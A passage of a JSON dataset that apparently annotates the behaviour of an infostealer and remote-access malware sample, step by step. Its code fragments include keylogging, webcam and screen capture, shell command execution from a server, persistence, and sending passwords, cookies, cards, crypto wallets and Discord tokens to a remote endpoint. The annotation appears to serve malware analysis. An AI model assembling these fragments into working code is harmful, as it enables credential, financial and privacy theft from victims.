              "action_description": "Executes shell command",
              "action_id": "execute_shell_command",
              "object": "'wmic csproduct get uuid'",
              "object_description": "Shell command",
              "object_id": "shell_command",
              "intention_description": "Get hardware UUID",
              "intention_id": "get_hardware_uuid"
            },
            {
              "action_api": "requests.get()",
              "action_description": "Sends HTTP request",
              "action_id": "send_http_request",
              "object": "'https://api.ipify.org'",
              "object_description": "External domain",
              "object_id": "external_domain",
              "intention_description": "Collect public IP address",
              "intention_id": "collect_public_ip"
            },
            {
              "action_api": "os.getenv()",
              "action_description": "Retrieves value of environment variable",
              "action_id": "get_env_var",
              "object": "\"UserName\"",
              "object_description": "Environment variable",
              "object_id": "environment_variable",
              "intention_description": "Collect current username",
              "intention_id": "collect_current_username"
            },
            {
              "action_api": "os.getenv()",
              "action_description": "Retrieves value of environment variable",
              "action_id": "get_env_var",
              "object": "\"COMPUTERNAME\"",
              "object_description": "Environment variable",
              "object_id": "environment_variable",
              "intention_description": "Collect system hostname",
              "intention_id": "collect_system_hostname"
            },
            {
              "action_api": "platform.system()",
              "action_description": "Retrieves operating system identifier",
              "action_id": "get_os_id",
              "object": "",
              "object_description": "",
              "object_id": "",
              "intention_description": "Get operating system name",
              "intention_id": "get_operating_system_name"
            },
            {
              "action_api": "platform.version()",
              "action_description": "Retrieves operating system version",
              "action_id": "get_os_version",
              "object": "",
              "object_description": "",
              "object_id": "",
              "intention_description": "Get operating system version",
              "intention_id": "get_operating_system_version"
            },
            {
              "action_api": "socket.gethostbyname()",
              "action_description": "Resolves host name to IPv4 address",
              "action_id": "resolve_hostname",
              "object": "socket.gethostname()",
              "object_description": "System hostname",
              "object_id": "system_hostname",
              "intention_description": "Resolve hostname to IP address",
              "intention_id": "resolve_hostname_ip"
            },
            {
              "action_api": "platform.machine()",
              "action_description": "Retrieves machine type",
              "action_id": "get_machine_type",
              "object": "",
              "object_description": "",
              "object_id": "",
              "intention_description": "Get system info",
              "intention_id": "get_system_info"
            },
            {
              "action_api": "ImageGrab.grab()",
              "action_description": "Captures screenshot of screen",
              "action_id": "capture_screen_region",
              "object": "",
              "object_description": "",
              "object_id": "",
              "intention_description": "Capture screenshot",
              "intention_id": "capture_screenshot"
            },
            {
              "action_api": "screenshot.save()",
              "action_description": "Saves image to file",
              "action_id": "save_image_file",
              "object": "path",
              "object_description": "Image file",
              "object_id": "image_file",
              "intention_description": "Save screenshot to file",
              "intention_id": "save_screenshot_file"
            },
            {
              "action_api": "cv2.VideoCapture()",
              "action_description": "Creates video capture object",
              "action_id": "create_video_capture",
              "object": "0",
              "object_description": "Camera device index",
              "object_id": "camera_device_index",
              "intention_description": "Access system camera",
              "intention_id": "access_system_camera"
            },
            {
              "action_api": "cap.read()",
              "action_description": "Reads frame from video capture device",
              "action_id": "read_video_frame",
              "object": "",
              "object_description": "",
              "object_id": "",
              "intention_description": "Access camera frame",
              "intention_id": "access_camera_frame"
            },
            {
              "action_api": "cv2.imwrite()",
              "action_description": "Saves image to file",
              "action_id": "save_image_file",
              "object": "filename, frame",
              "object_description": "Image file",
              "object_id": "image_file",
              "intention_description": "Save screenshot to file",
              "intention_id": "save_screenshot_file"
            },
            {
              "action_api": "cap.release()",
              "action_description": "Releases video capture device",
              "action_id": "release_video_device",
              "object": "",
              "object_description": "",
              "object_id": "",
              "intention_description": "Release system resource",
              "intention_id": "release_system_resource"
            },
            {
              "action_api": "os.path.expanduser()",
              "action_description": "Special path operations (home directory expansion, temporary directory path, executable path, directory tree generation)",
              "action_id": "path_special_operations",
              "object": "\"~\"",
              "object_description": "Home directory path",
              "object_id": "home_directory_path",
              "intention_description": "Access user home directory",
              "intention_id": "access_user_home_directory"
            },
            {
              "action_api": "os.path.join()",
              "action_description": "Basic path string operations (getting absolute path, base name, parent directory, splitting and joining paths)",
              "action_id": "path_string_operations",
              "object": "os.path.expanduser(\"~\"), \"Downloads\"",
              "object_description": "User home directory",
              "object_id": "user_home_directory",
              "intention_description": "Prepare directory path",
              "intention_id": "prepare_directory_path"
            },
            {
              "action_api": "os.chdir()",
              "action_description": "Changes current working directory",
              "action_id": "change_working_dir",
              "object": "path",
              "object_description": "Directory path",
              "object_id": "directory_path",
              "intention_description": "Change working directory",
              "intention_id": "change_working_directory"
            },
            {
              "action_api": "os.listdir()",
              "action_description": "List directory contents",
              "action_id": "list_directory_contents",
              "object": "path",
              "object_description": "Directory path",
              "object_id": "directory_path",
              "intention_description": "List files in directory",
              "intention_id": "list_directory_files"
            },
            {
              "action_api": "os.walk()",
              "action_description": "Special path operations (home directory expansion, temporary directory path, executable path, directory tree generation)",
              "action_id": "path_special_operations",
              "object": "roaming+\"/Mozilla/Firefox/Profiles\"",
              "object_description": "Directory path",
              "object_id": "directory_path",
              "intention_description": "List files in directory",
              "intention_id": "list_directory_files"
            },
            {
              "action_api": "open()",
              "action_description": "File opening operations for reading (normal reading, binary reading)",
              "action_id": "basic_read_operations",
              "object": "f'{path}/{file}', errors='ignore'",
              "object_description": "Local file",
              "object_id": "local_file",
              "intention_description": "Read file content",
              "intention_id": "read_file_content"
            },
            {
              "action_api": "re.findall()",
              "action_description": "Compiles regular expression pattern",
              "action_id": "compile_regex",
              "object": "self.regexp, line",
              "object_description": "Regular expression and file content",
              "object_id": "regex_file_content",
              "intention_description": "Extract browser tokens",
              "intention_id": "extract_browser_tokens"
            },
            {
              "action_api": "Token()",
              "action_description": "Instantiates Token class",
              "action_id": "init_grabber_class",
              "object": "token",
              "object_description": "Account name and token",
              "object_id": "account_credentials",
              "intention_description": "Collect browser tokens",
              "intention_id": "collect_browser_tokens"
            },
            {
              "action_api": "keyboard.hook()",
              "action_description": "Registers keylogger event handler",
              "action_id": "register_keylogger_handler",
              "object": "self.keylog_event",
              "object_description": "Keyboard event handler",
              "object_id": "keyboard_event_handler",
              "intention_description": "Start keylogger in new thread",
              "intention_id": "start_keylogger_thread"
            },
            {
              "action_api": "keyboard.unhook_all()",
              "action_description": "Removes all keyboard hooks",
              "action_id": "remove_keyboard_hooks",
              "object": "",
              "object_description": "",
              "object_id": "",
              "intention_description": "Release keyboard hook",
              "intention_id": "release_keyboard_hook"
            },
            {
              "action_api": "sio.emit()",
              "action_description": "Sends data to server",
              "action_id": "send_data_server",
              "object": "'keylog-response', self.data",
              "object_description": "Keylog data",
              "object_id": "keylog_data",
              "intention_description": "Send keylog data to server",
              "intention_id": "send_keylog_data_server"
            },
            {
              "action_api": "sio.emit()",
              "action_description": "Sends data to server",
              "action_id": "send_data_server",
              "object": "'command-response', os.popen(cmd['cmd']).read()",
              "object_description": "Command output",
              "object_id": "command_output",
              "intention_description": "Send command output to server",
              "intention_id": "send_command_output_server"
            },
            {
              "action_api": "sio.emit()",
              "action_description": "Sends data to server",
              "action_id": "send_data_server",
              "object": "'history-response', GrabbBrowsers().start('history')",
              "object_description": "Browser history data",
              "object_id": "browser_history",
              "intention_description": "Send browser data to server",
              "intention_id": "send_browser_data_server"
            },
            {
              "action_api": "sio.emit()",
              "action_description": "Sends data to server",
              "action_id": "send_data_server",
              "object": "'discord-tokens-response', information['tokens']",
              "object_description": "Account name and token",
              "object_id": "account_credentials",
              "intention_description": "Send Discord tokens to server",
              "intention_id": "send_discord_tokens_server"
            },
            {
              "action_api": "sio.emit()",
              "action_description": "Sends data to server",
              "action_id": "send_data_server",
              "object": "'cards-response', GrabbBrowsers().start('cards')",
              "object_description": "Browser card data",
              "object_id": "browser_card_data",
              "intention_description": "Send browser data to server",
              "intention_id": "send_browser_data_server"
            },
            {
              "action_api": "sio.emit()",
              "action_description": "Sends data to server",
              "action_id": "send_data_server",
              "object": "'passwords-response', GrabbBrowsers().start('passwords')",
              "object_description": "Browser password data",
              "object_id": "browser_passwords",
              "intention_description": "Send password data to server",
              "intention_id": "send_password_data_server"
            },
            {
              "action_api": "os.path.exists()",
              "action_description": "Checks if specified path exists in filesystem",
              "action_id": "check_path_exists",
              "object": "filename",
              "object_description": "File path",
              "object_id": "file_path",
              "intention_description": "Determine presence of file",
              "intention_id": "determine_file_presence"
            },
            {
              "action_api": "open()",
              "action_description": "File opening operations for reading (normal reading, binary reading)",
              "action_id": "basic_read_operations",
              "object": "filename, \"rb\"",
              "object_description": "Local file",
              "object_id": "local_file",
              "intention_description": "Read file content",
              "intention_id": "read_file_content"
            },
            {
              "action_api": "sio.emit()",
              "action_description": "Sends data to server",
              "action_id": "send_data_server",
              "object": "'download-response', {'file.' + filename.split('.')[-1]: data}",
              "object_description": "File data",
              "object_id": "file_text",
              "intention_description": "Send file data to server",
              "intention_id": "send_file_data_server"
            },
            {
              "action_api": "sio.emit()",
              "action_description": "Sends data to server",
              "action_id": "send_data_server",
              "object": "'backup-codes-response', FileMagnament().getBackupCodes()",
              "object_description": "Backup codes data",
              "object_id": "backup_codes",
              "intention_description": "Send file data to server",
              "intention_id": "send_file_data_server"
            },
            {
              "action_api": "sio.emit()",
              "action_description": "Sends data to server",
              "action_id": "send_data_server",
              "object": "'cookies-response', GrabbBrowsers().start('cookies')",
              "object_description": "Browser cookies data",
              "object_id": "browser_cookies",
              "intention_description": "Send cookies data to server",
              "intention_id": "send_cookies_data_server"
            },
            {
              "action_api": "webbrowser.open()",
              "action_description": "Opens URL with associated application",
              "action_id": "open_file_app",
              "object": "url",
              "object_description": "URL string",
              "object_id": "url_string",
              "intention_description": "Open URL in default browser",
              "intention_id": "open_url_browser"
            },
            {
              "action_api": "requests.get()",
              "action_description": "Sends HTTP request",
              "action_id": "send_http_request",
              "object": "args['url']",
              "object_description": "External domain",
              "object_id": "external_domain",
              "intention_description": "Download remote content",
              "intention_id": "download_remote_content"
            },
            {
              "action_api": "open()",
              "action_description": "File opening operations for writing (normal writing, binary writing)",
              "action_id": "basic_write_operations",
              "object": "args['path'], \"wb\"",
              "object_description": "File path",
              "object_id": "file_path",
              "intention_description": "Write downloaded content to file",
              "intention_id": "write_downloaded_content_file"
            },
            {
              "action_api": "f.write()",
              "action_description": "Writes file content",
              "action_id": "basic_write_operations",
              "object": "response.content",
              "object_description": "File text",
              "object_id": "file_text",
              "intention_description": "Write downloaded content to file",
              "intention_id": "write_downloaded_content_file"
            },
            {
              "action_api": "threading.Thread()",
              "action_description": "Creates new thread to execute",
              "action_id": "create_thread",
              "object": "target=ctypes.windll.user32.MessageBoxW, args=(0, alert, '#YeezyGvng & #WapnedGvng', 0x10,)",
              "object_description": "Thread target and arguments",
              "object_id": "thread_target_arguments",
              "intention_description": "Run function in child process",
              "intention_id": "run_function_child_process"
            },
            {
              "action_api": "sio.emit()",
              "action_description": "Sends data to server",
              "action_id": "send_data_server",
              "object": "'wallets-response', FileMagnament().basicGrb(wallets=True)",
              "object_description": "Wallet data",
              "object_id": "wallet_data",
              "intention_description": "Send file data to server",
              "intention_id": "send_file_data_server"
            },
            {
              "action_api": "sio.emit()",
              "action_description": "Sends data to server",
              "action_id": "send_data_server",
              "object": "'gamestores-response', FileMagnament().basicGrb(relevant=True)",
              "object_description": "Game store data",
              "object_id": "game_store_data",
              "intention_description": "Send file data to server",
              "intention_id": "send_file_data_server"
            },
            {
              "action_api": "open()",
              "action_description": "File opening operations for reading (normal reading, binary reading)",
              "action_id": "basic_read_operations",
              "object": "Obj.screenshot(), 'rb'",
              "object_description": "Image file",
              "object_id": "image_file",
              "intention_description": "Read screenshot file content",
              "intention_id": "read_screenshot_file_content"
            },
            {
              "action_api": "sio.emit()",
              "action_description": "Sends data to server",
              "action_id": "send_data_server",
              "object": "'screenshot-response', image_data",
              "object_description": "Image binary stream",
              "object_id": "image_binary_stream",
              "intention_description": "Send screenshot to server",
              "intention_id": "send_screenshot_server"
            },
            {
              "action_api": "open()",
              "action_description": "File opening operations for reading (normal reading, binary reading)",
              "action_id": "basic_read_operations",
              "object": "file, 'rb'",
              "object_description": "Image file",
              "object_id": "image_file",
              "intention_description": "Read screenshot file content",
              "intention_id": "read_screenshot_file_content"
            },
            {
              "action_api": "sio.emit()",
              "action_description": "Sends data to server",
              "action_id": "send_data_server",
              "object": "'webcam-response', image_data",
              "object_description": "Image binary stream",
              "object_id": "image_binary_stream",
              "intention_description": "Send screenshot to server",
              "intention_id": "send_screenshot_server"
            },
            {
              "action_api": "requests.get()",
              "action_description": "Sends HTTP request",
              "action_id": "send_http_request",
              "object": "'https://api.ipify.org'",
              "object_description": "External domain",
              "object_id": "external_domain",
              "intention_description": "Collect public IP address",
              "intention_id": "collect_public_ip"
            },
            {
              "action_api": "sio.emit()",
              "action_description": "Sends data to server",
              "action_id": "send_data_server",
              "object": "'ip-response', requests.get('https://api.ipify.org').text",
              "object_description": "Public IP address",
              "object_id": "public_ip_address",
              "intention_description": "Send system information to server",
              "intention_id": "send_system_info_server"
            },
            {
              "action_api": "sio.emit()",
              "action_description": "Sends data to server",
              "action_id": "send_data_server",
              "object": "'information-response', Obj.getInformation()",
              "object_description": "System info",
              "object_id": "system_info",
              "intention_description": "Send system information to server",
              "intention_id": "send_system_info_server"
            },
            {
              "action_api": "threading.Thread()",
              "action_description": "Creates new thread to execute",
              "action_id": "create_thread",
              "object": "target=KeyLogger().start",
              "object_description": "Thread target and arguments",
              "object_id": "thread_target_arguments",
              "intention_description": "Start keylogger in new thread",
              "intention_id": "start_keylogger_thread"
            },
            {
              "action_api": "os.path.exists()",
              "action_description": "Checks if specified path exists in filesystem",
              "action_id": "check_path_exists",
              "object": "path",
              "object_description": "Directory path",
              "object_id": "directory_path",
              "intention_description": "Check if file or directory exists",
              "intention_id": "check_file_existence"
            },
            {
              "action_api": "os.listdir()",
              "action_description": "List directory contents",
              "action_id": "list_directory_contents",
              "object": "path",
              "object_description": "Directory path",
              "object_id": "directory_path",
              "intention_description": "List files in directory",
              "intention_id": "list_directory_files"
            },
            {
              "action_api": "sio.emit()",
              "action_description": "Sends data to server",
              "action_id": "send_data_server",
              "object": "'listdir-response', {\"path\": path, \"files\":os.listdir(path)}",
              "object_description": "Directory path",
              "object_id": "directory_path",
              "intention_description": "Send directory listing to server",
              "intention_id": "send_directory_listing_server"
            },
            {
              "action_api": "Startup()",
              "action_description": "Instantiates Startup class",
              "action_id": "init_startup_class",
              "object": "",
              "object_description": "",
              "object_id": "",
              "intention_description": "Setup persistence in startup directory",
              "intention_id": "setup_startup_persistence"
            },
            {
              "action_api": "FileMagnament().basicGrb()",
              "action_description": "Instantiates FileMagnament class",
              "action_id": "init_grabber_class",
              "object": "wallets=True, read=False",
              "object_description": "Wallet data",
              "object_id": "wallet_data",
              "intention_description": "Prepare wallet files for upload",
              "intention_id": "wallet_upload_preparation"
            },
            {
              "action_api": "GrabbBrowsers().start()",
              "action_description": "Instantiates GrabbBrowsers class",
              "action_id": "init_grabber_class",
              "object": "'all'",
              "object_description": "Browser data",
              "object_id": "browser_data",
              "intention_description": "Collect all browser data",
              "intention_id": "collect_browser_data"
            },
            {
              "action_api": "GetTokens().start()",
              "action_description": "Instantiates GetTokens class",
              "action_id": "init_grabber_class",
              "object": "",
              "object_description": "",
              "object_id": "",
              "intention_description": "Collect browser tokens",
              "intention_id": "collect_browser_tokens"
            },
            {
              "action_api": "requests.post()",
              "action_description": "Sends HTTP request",
              "action_id": "send_http_request",
              "object": "url=f'{api_url}/api/{user_id}/', json=information",
              "object_description": "API endpoint",
              "object_id": "api_endpoint",
              "intention_description": "Transmit environment data to remote server",
              "intention_id": "transmit_environment_data_server"
            },
            {
              "action_api": "requests.post()",
              "action_description": "Sends HTTP request",
              "action_id": "send_http_request",
              "object": "url=f'{api_url}/api/{user_id}/wallets/', files=wallets_",
              "object_description": "API endpoint",
              "object_id": "api_endpoint",
              "intention_description": "Transmit file data to server",
              "intention_id": "transmit_file_data_server"
            },
            {
              "action_api": "sio.connect()",
              "action_description": "Creates HTTP connection to specified host",
              "action_id": "create_http_connection",
              "object": "api_url",
              "object_description": "API endpoint",
              "object_id": "api_endpoint",
              "intention_description": "Connect to remote server",
              "intention_id": "connect_remote_server"
            },
            {
              "action_api": "sio.wait()",
              "action_description": "Wait for events",
              "action_id": "wait_for_events",
              "object": "",
              "object_description": "",
              "object_id": "",
              "intention_description": "Wait for events",
              "intention_id": "wait_for_events"
            },
            {
              "action_api": "sio.disconnect()",
              "action_description": "Disconnects from remote server",
              "action_id": "disconnect_remote_server",
              "object": "",
              "object_description": "",
              "object_id": "",
              "intention_description": "Disconnect from remote server",
              "intention_id": "disconnect_remote_server"
            }
          ]
        }
      ]
    }
  ]
}